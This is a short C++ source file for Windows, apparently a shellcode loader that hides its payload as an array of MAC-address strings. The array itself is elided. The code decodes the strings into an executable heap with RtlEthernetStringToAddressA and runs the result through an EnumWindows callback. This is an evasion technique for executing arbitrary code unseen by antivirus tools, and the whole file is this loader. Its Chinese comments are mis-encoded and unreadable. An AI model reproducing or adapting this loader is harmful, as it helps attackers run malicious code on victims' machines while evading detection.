#include<Windows.h>
#include <iostream>
#include<ip2string.h>
#pragma comment(lib,"Ntdll.lib")


//��ת�����shellcode��shellcode->mac��
const char* mac_[] =
{
    ...
};


int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//�ڽ��̵������ַ�ռ��б����ռ�
    void* SB = HeapAlloc(hc, 0, 0x100000);//�����ڴ�
    DWORD_PTR hptr = (DWORD_PTR)SB;
    int elems = sizeof(mac_) / sizeof(mac_[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (RtlEthernetStringToAddressA(mac_[i], &Terminator, (DL_EUI48*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 6;
    }
    EnumWindows((WNDENUMPROC)SB, 0);
};